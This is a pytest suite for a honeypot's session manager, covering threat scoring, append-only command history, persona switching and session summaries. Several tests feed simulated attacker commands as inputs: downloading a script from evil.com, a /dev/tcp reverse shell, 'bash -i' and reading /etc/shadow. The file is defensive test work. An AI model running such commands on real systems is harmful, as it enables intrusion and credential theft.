"""Tests for Session Manager -- Sprint 4.

Covers:
    - SessionState model invariants
    - create_session (async, with IP reputation)
    - get_session / get_all_active
    - update_after_command (score monotonicity, append-only history,
      cumulative patterns, category tracking)
    - record_persona_switch / complete_transition
    - close_session (removal + summary dict)
    - Edge cases (double close, unknown session, score clamping)
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch

import pytest

from honeypot.ip_reputation import IPReputationResult
from honeypot.session_manager import SessionManager, SessionState
from honeypot.threat_scorer import CommandCategory, ThreatLevel


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def _mock_ip_rep(bonus: int = 0, abuse: int = 0, tor: bool = False):
    """Return a patched check_ip_reputation that yields a fixed result."""
    result = IPReputationResult(
        ip="0.0.0.0",
        abuse_confidence_score=abuse,
        is_tor=tor,
        initial_score_bonus=bonus,
    )

    async def _fake_check(ip: str) -> IPReputationResult:
        return result

    return patch(
        "honeypot.session_manager.check_ip_reputation",
        side_effect=_fake_check,
    )


@pytest.fixture
def mgr():
    return SessionManager()


def _create(mgr, **kwargs):
    """Shorthand: create_session with mocked IP rep (bonus=0 by default)."""
    bonus = kwargs.pop("ip_bonus", 0)
    defaults = {
        "attacker_ip": "10.0.0.1",
        "attacker_port": 54321,
        "persona_name": "generic_linux",
        "login_user": "ubuntu",
        "home_directory": "/home/ubuntu",
    }
    defaults.update(kwargs)
    with _mock_ip_rep(bonus=bonus):
        return _run(mgr.create_session(**defaults))


# ===================================================================
# SessionState model
# ===================================================================

class TestSessionState:

    def test_defaults(self):
        s = SessionState()
        assert s.threat_score == 0
        assert s.threat_level == ThreatLevel.LOW
        assert s.command_history == []
        assert s.patterns_detected == set()
        assert s.active_persona == "generic_linux"
        assert s.total_commands == 0

    def test_score_clamp_above_100(self):
        s = SessionState(threat_score=150)
        assert s.threat_score == 100

    def test_score_clamp_below_0(self):
        s = SessionState(threat_score=-10)
        assert s.threat_score == 0

    def test_overlay_is_independent(self):
        s1 = SessionState()
        s2 = SessionState()
        s1.overlay.mkdir("/tmp/test")
        assert "/tmp/test" not in s2.overlay.entries

    def test_session_id_auto_generated(self):
        s1 = SessionState()
        s2 = SessionState()
        assert s1.session_id != s2.session_id
        assert len(s1.session_id) == 12

    def test_start_time_is_utc(self):
        s = SessionState()
        assert s.start_time.tzinfo is not None


# ===================================================================
# create_session
# ===================================================================

class TestCreateSession:

    def test_basic_create(self, mgr):
        session = _create(mgr)
        assert session.attacker_ip == "10.0.0.1"
        assert session.attacker_port == 54321
        assert session.current_user == "ubuntu"
        assert session.active_persona == "generic_linux"
        assert mgr.active_count() == 1

    def test_custom_session_id(self, mgr):
        session = _create(mgr, session_id="custom-123")
        assert session.session_id == "custom-123"

    def test_ip_reputation_bonus_applied(self, mgr):
        session = _create(mgr, ip_bonus=15)
        assert session.threat_score == 15
        assert session.threat_level == ThreatLevel.LOW

    def test_high_bonus_sets_medium(self, mgr):
        session = _create(mgr, ip_bonus=25)
        assert session.threat_score == 25
        assert session.threat_level == ThreatLevel.MEDIUM

    def test_ip_reputation_stored(self, mgr):
        rep = IPReputationResult(
            ip="45.33.32.156",
            abuse_confidence_score=90,
            is_tor=True,
            initial_score_bonus=35,
        )

        async def _fake(ip):
            return rep

        with patch(
            "honeypot.session_manager.check_ip_reputation",
            side_effect=_fake,
        ):
            session = _run(mgr.create_session(
                attacker_ip="45.33.32.156",
            ))
        assert session.ip_reputation is not None
        assert session.ip_reputation.abuse_confidence_score == 90
        assert session.ip_reputation.is_tor is True

    def test_multiple_sessions(self, mgr):
        s1 = _create(mgr, session_id="aaa")
        s2 = _create(mgr, session_id="bbb")
        assert mgr.active_count() == 2
        assert mgr.get_session("aaa") is s1
        assert mgr.get_session("bbb") is s2

    def test_overlay_uses_login_user(self, mgr):
        session = _create(mgr, login_user="john")
        assert session.overlay._default_owner == "john"

    def test_environment_passed_through(self, mgr):
        env = {"PATH": "/usr/bin", "HOME": "/home/test"}
        session = _create(mgr, environment=env)
        assert session.environment["PATH"] == "/usr/bin"


# ===================================================================
# get_session
# ===================================================================

class TestGetSession:

    def test_existing_session(self, mgr):
        session = _create(mgr, session_id="test-1")
        assert mgr.get_session("test-1") is session

    def test_missing_session_returns_none(self, mgr):
        assert mgr.get_session("nonexistent") is None


# ===================================================================
# update_after_command
# ===================================================================

class TestUpdateAfterCommand:

    def test_benign_command_no_score_change(self, mgr):
        _create(mgr, session_id="s1")
        decision = mgr.update_after_command("s1", "ls", "file1  file2", "fast_path")
        session = mgr.get_session("s1")
        assert session.threat_score == 0
        assert decision.command_category == CommandCategory.BENIGN

    def test_score_increases(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        session = mgr.get_session("s1")
        assert session.threat_score >= 1

    def test_score_never_decreases(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "cat /etc/shadow", "Permission denied", "fast_path")
        score_after_shadow = mgr.get_session("s1").threat_score
        assert score_after_shadow > 0

        mgr.update_after_command("s1", "ls", "file1", "fast_path")
        assert mgr.get_session("s1").threat_score >= score_after_shadow

    def test_history_is_append_only(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        mgr.update_after_command("s1", "id", "uid=1000", "fast_path")
        session = mgr.get_session("s1")
        assert len(session.command_history) == 2
        assert session.command_history[0]["raw"] == "whoami"
        assert session.command_history[1]["raw"] == "id"

    def test_history_entry_has_required_fields(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "uname -a", "Linux ...", "fast_path")
        entry = mgr.get_session("s1").command_history[0]
        assert "raw" in entry
        assert "output" in entry
        assert "source" in entry
        assert "cwd" in entry
        assert "category" in entry
        assert "score_delta" in entry

    def test_output_truncated_at_200(self, mgr):
        _create(mgr, session_id="s1")
        long_output = "x" * 500
        mgr.update_after_command("s1", "cat bigfile", long_output, "fast_path")
        entry = mgr.get_session("s1").command_history[0]
        assert len(entry["output"]) == 200

    def test_total_commands_increments(self, mgr):
        _create(mgr, session_id="s1")
        for i in range(5):
            mgr.update_after_command("s1", "ls", "", "fast_path")
        assert mgr.get_session("s1").total_commands == 5

    def test_categories_seen_tracked(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        mgr.update_after_command("s1", "cat /etc/passwd", "root:x:0:0...", "fast_path")
        session = mgr.get_session("s1")
        assert "reconnaissance" in session.categories_seen
        assert "exploration" in session.categories_seen

    def test_benign_not_in_categories_seen(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "ls", "file1", "fast_path")
        assert "benign" not in mgr.get_session("s1").categories_seen

    def test_patterns_detected_cumulative(self, mgr):
        _create(mgr, session_id="s1")
        recon_cmds = ["whoami", "id", "uname", "hostname", "arch", "w", "who"]
        for cmd in recon_cmds:
            mgr.update_after_command("s1", cmd, "output", "fast_path")
        session = mgr.get_session("s1")
        assert "rapid_recon_burst" in session.patterns_detected

    def test_score_clamped_at_100(self, mgr):
        _create(mgr, session_id="s1", ip_bonus=80)
        for cmd in ["cat /etc/shadow", "sudo su", "wget http://evil.com/shell.sh",
                     "bash -i", "/dev/tcp/10.0.0.1/4444"]:
            mgr.update_after_command("s1", cmd, "", "fast_path")
        assert mgr.get_session("s1").threat_score <= 100

    def test_threat_level_updates(self, mgr):
        _create(mgr, session_id="s1")
        session = mgr.get_session("s1")
        assert session.threat_level == ThreatLevel.LOW

        high_cmds = [
            "cat /etc/shadow", "sudo su", "wget http://evil.com/payload",
            "bash -i", "/dev/tcp/10.0.0.1/4444",
        ]
        for cmd in high_cmds:
            mgr.update_after_command("s1", cmd, "", "fast_path")

        session = mgr.get_session("s1")
        assert session.threat_level in (ThreatLevel.HIGH, ThreatLevel.CRITICAL)

    def test_unknown_session_raises(self, mgr):
        with pytest.raises(KeyError):
            mgr.update_after_command("nonexistent", "ls", "", "fast_path")

    def test_persona_switch_triggered(self, mgr):
        _create(mgr, session_id="s1")
        escalation = [
            "cat /etc/shadow", "sudo su", "wget http://evil.com/shell.sh",
            "chmod +x shell.sh", "bash -i",
        ]
        switch_triggered = False
        for cmd in escalation:
            decision = mgr.update_after_command("s1", cmd, "", "fast_path")
            if decision.trigger_persona_switch:
                switch_triggered = True
                break
        assert switch_triggered


# ===================================================================
# record_persona_switch / complete_transition
# ===================================================================

class TestPersonaSwitching:

    def test_record_switch(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation", transition_steps=4)
        session = mgr.get_session("s1")
        assert session.persona_transition_in_progress is True
        assert session.persona_transition_target == "dev_workstation"
        assert session.persona_transition_steps_remaining == 4
        assert session.persona_switch_count == 1

    def test_complete_transition(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")
        session = mgr.get_session("s1")
        assert session.active_persona == "dev_workstation"
        assert session.persona_transition_in_progress is False
        assert session.persona_transition_target is None
        assert session.persona_transition_steps_remaining == 0

    def test_switch_preserves_history(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        mgr.update_after_command("s1", "id", "uid=1000", "fast_path")
        history_before = len(mgr.get_session("s1").command_history)

        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")

        assert len(mgr.get_session("s1").command_history) == history_before

    def test_switch_preserves_score(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "cat /etc/shadow", "", "fast_path")
        score_before = mgr.get_session("s1").threat_score

        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")

        assert mgr.get_session("s1").threat_score == score_before

    def test_switch_preserves_patterns(self, mgr):
        _create(mgr, session_id="s1")
        recon = ["whoami", "id", "uname", "hostname", "arch", "w", "who"]
        for cmd in recon:
            mgr.update_after_command("s1", cmd, "", "fast_path")
        patterns_before = set(mgr.get_session("s1").patterns_detected)

        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")

        assert mgr.get_session("s1").patterns_detected == patterns_before

    def test_switch_preserves_session_id(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")
        assert mgr.get_session("s1").session_id == "s1"

    def test_double_switch_ignored_during_transition(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.record_persona_switch("s1", "finance_server")
        session = mgr.get_session("s1")
        assert session.persona_transition_target == "dev_workstation"
        assert session.persona_switch_count == 1

    def test_second_switch_after_complete(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")
        mgr.record_persona_switch("s1", "finance_server")
        mgr.complete_transition("s1")
        session = mgr.get_session("s1")
        assert session.active_persona == "finance_server"
        assert session.persona_switch_count == 2

    def test_complete_without_switch_is_noop(self, mgr):
        _create(mgr, session_id="s1")
        mgr.complete_transition("s1")
        session = mgr.get_session("s1")
        assert session.active_persona == "generic_linux"

    def test_unknown_session_raises_on_switch(self, mgr):
        with pytest.raises(KeyError):
            mgr.record_persona_switch("nonexistent", "dev_workstation")

    def test_unknown_session_raises_on_complete(self, mgr):
        with pytest.raises(KeyError):
            mgr.complete_transition("nonexistent")


# ===================================================================
# close_session
# ===================================================================

class TestCloseSession:

    def test_close_removes_from_store(self, mgr):
        _create(mgr, session_id="s1")
        assert mgr.active_count() == 1
        mgr.close_session("s1")
        assert mgr.active_count() == 0
        assert mgr.get_session("s1") is None

    def test_close_returns_summary(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        mgr.update_after_command("s1", "cat /etc/passwd", "root:x:0...", "fast_path")
        summary = mgr.close_session("s1")

        assert summary["session_id"] == "s1"
        assert summary["attacker_ip"] == "10.0.0.1"
        assert summary["total_commands"] == 2
        assert summary["final_threat_score"] >= 0
        assert summary["final_threat_level"] in ("low", "medium", "high", "critical")
        assert summary["final_persona"] == "generic_linux"
        assert isinstance(summary["command_history"], list)
        assert len(summary["command_history"]) == 2

    def test_summary_has_timing(self, mgr):
        _create(mgr, session_id="s1")
        summary = mgr.close_session("s1")
        assert "start_time" in summary
        assert "end_time" in summary
        assert "duration_seconds" in summary
        assert summary["duration_seconds"] >= 0

    def test_summary_has_patterns(self, mgr):
        _create(mgr, session_id="s1")
        recon = ["whoami", "id", "uname", "hostname", "arch", "w", "who"]
        for cmd in recon:
            mgr.update_after_command("s1", cmd, "", "fast_path")
        summary = mgr.close_session("s1")
        assert isinstance(summary["patterns_detected"], list)
        assert "rapid_recon_burst" in summary["patterns_detected"]

    def test_summary_has_categories(self, mgr):
        _create(mgr, session_id="s1")
        mgr.update_after_command("s1", "whoami", "ubuntu", "fast_path")
        summary = mgr.close_session("s1")
        assert "reconnaissance" in summary["categories_seen"]

    def test_summary_has_ip_reputation(self, mgr):
        rep = IPReputationResult(
            ip="45.33.32.156",
            abuse_confidence_score=85,
            is_tor=True,
            initial_score_bonus=35,
        )

        async def _fake(ip):
            return rep

        with patch(
            "honeypot.session_manager.check_ip_reputation",
            side_effect=_fake,
        ):
            _run(mgr.create_session(
                attacker_ip="45.33.32.156", session_id="s1",
            ))
        summary = mgr.close_session("s1")
        assert summary["ip_reputation"]["abuse_confidence_score"] == 85
        assert summary["ip_reputation"]["is_tor"] is True
        assert summary["ip_reputation"]["initial_score_bonus"] == 35

    def test_summary_persona_switch_count(self, mgr):
        _create(mgr, session_id="s1")
        mgr.record_persona_switch("s1", "dev_workstation")
        mgr.complete_transition("s1")
        summary = mgr.close_session("s1")
        assert summary["persona_switch_count"] == 1
        assert summary["final_persona"] == "dev_workstation"

    def test_double_close_raises(self, mgr):
        _create(mgr, session_id="s1")
        mgr.close_session("s1")
        with pytest.raises(KeyError):
            mgr.close_session("s1")


# ===================================================================
# get_all_active
# ===================================================================

class TestGetAllActive:

    def test_empty(self, mgr):
        assert mgr.get_all_active() == {}

    def test_returns_all(self, mgr):
        _create(mgr, session_id="a1")
        _create(mgr, session_id="a2")
        _create(mgr, session_id="a3")
        active = mgr.get_all_active()
        assert len(active) == 3
        assert set(active.keys()) == {"a1", "a2", "a3"}

    def test_closed_not_in_active(self, mgr):
        _create(mgr, session_id="a1")
        _create(mgr, session_id="a2")
        mgr.close_session("a1")
        active = mgr.get_all_active()
        assert "a1" not in active
        assert "a2" in active


# ===================================================================
# Realistic end-to-end scenario
# ===================================================================

class TestRealisticScenario:

    def test_full_attack_lifecycle(self, mgr):
        """Simulate a complete attack session from connect to close."""
        session = _create(mgr, session_id="attack-1", attacker_ip="10.0.0.99")

        recon_phase = ["whoami", "id", "uname -a", "hostname", "cat /etc/os-release"]
        for cmd in recon_phase:
            mgr.update_after_command("attack-1", cmd, "output", "fast_path")

        session = mgr.get_session("attack-1")
        assert session.threat_score > 0
        assert session.total_commands == 5

        explore_phase = ["cat /etc/passwd", "ps aux", "netstat -tulpn"]
        for cmd in explore_phase:
            mgr.update_after_command("attack-1", cmd, "output", "fast_path")

        session = mgr.get_session("attack-1")
        score_after_explore = session.threat_score

        escalate = ["sudo -l", "cat /etc/shadow"]
        for cmd in escalate:
            d = mgr.update_after_command("attack-1", cmd, "output", "fast_path")
            if d.trigger_persona_switch:
                mgr.record_persona_switch("attack-1", d.switch_to_persona)
                mgr.complete_transition("attack-1")

        session = mgr.get_session("attack-1")
        assert session.threat_score >= score_after_explore
        assert session.total_commands == 10

        summary = mgr.close_session("attack-1")
        assert summary["total_commands"] == 10
        assert summary["final_threat_score"] >= score_after_explore
        assert len(summary["categories_seen"]) >= 2
        assert mgr.get_session("attack-1") is None

    def test_ip_bonus_persists_through_commands(self, mgr):
        """IP reputation bonus should be the floor -- score never drops below it."""
        session = _create(mgr, session_id="s-bonus", ip_bonus=20)
        assert session.threat_score == 20

        mgr.update_after_command("s-bonus", "ls", "", "fast_path")
        mgr.update_after_command("s-bonus", "pwd", "", "fast_path")
        mgr.update_after_command("s-bonus", "clear", "", "fast_path")

        assert mgr.get_session("s-bonus").threat_score == 20
